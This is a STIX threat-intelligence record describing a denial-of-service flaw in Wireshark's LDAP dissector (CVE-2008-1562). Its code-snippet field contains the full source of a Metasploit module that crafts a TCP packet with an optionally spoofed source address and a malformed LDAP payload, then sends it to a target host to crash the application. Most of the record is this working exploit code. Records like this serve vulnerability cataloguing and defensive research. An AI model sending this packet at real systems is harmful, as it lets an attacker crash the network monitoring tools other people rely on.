{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e6712323-a729-4d9f-b85f-92af7ed1e3a0",
    "created": "2024-08-14T16:24:40.357303Z",
    "modified": "2024-08-14T16:24:40.357307Z",
    "name": "Wireshark LDAP Dissector DOS",
    "description": " The LDAP dissector in Wireshark 0.99.2 through 0.99.8 allows remote attackers to cause a denial of service (application crash) via a malformed packet. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/wireshark/ldap.rb",
            "external_id": "ldap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1562"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n  include Msf::Auxiliary::Dos\n\n  def initialize\n    super(\n      'Name'        => 'Wireshark LDAP Dissector DOS',\n      'Description' => %q{\n          The LDAP dissector in Wireshark 0.99.2 through 0.99.8 allows remote attackers\n          to cause a denial of service (application crash) via a malformed packet.\n      },\n      'Author'      => ['MC'],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2008-1562' ],\n          [ 'OSVDB', '43840' ],\n        ],\n      'DisclosureDate' => 'Mar 28 2008')\n\n    register_options([\n      OptInt.new('RPORT', [true, 'The destination port', 389]),\n      OptAddress.new('SHOST', [false, 'This option can be used to specify a spoofed source address', nil])\n    ])\n\n    deregister_options('FILTER','PCAPFILE')\n  end\n\n  def run\n\n    open_pcap\n\n    print_status(\"Sending malformed LDAP packet to #{rhost}\")\n\n    m = Rex::Text.rand_text_alpha_lower(3)\n\n    p = PacketFu::TCPPacket.new\n    p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)\n    p.ip_daddr = rhost\n    p.tcp_ack = rand(0x100000000)\n    p.tcp_flags.syn = 1\n    p.tcp_flags.ack = 1\n    p.tcp_dport = datastore['RPORT'].to_i\n    p.tcp_win = 3072\n    p.payload = \"0O\\002\\002;\\242cI\\004\\rdc=#{m},dc=#{m}\\n\\001\\002\\n\\001\\000\\002\\001\\000\\002\\001\\000\\001\\001\\000\\241'\\243\\016\"\n    p.recalc\n    capture_sendto(p, rhost)\n\n    close_pcap\n\n  end\nend\n",
    "x_mitre_disclosure_date": "Mar 28 2008"
}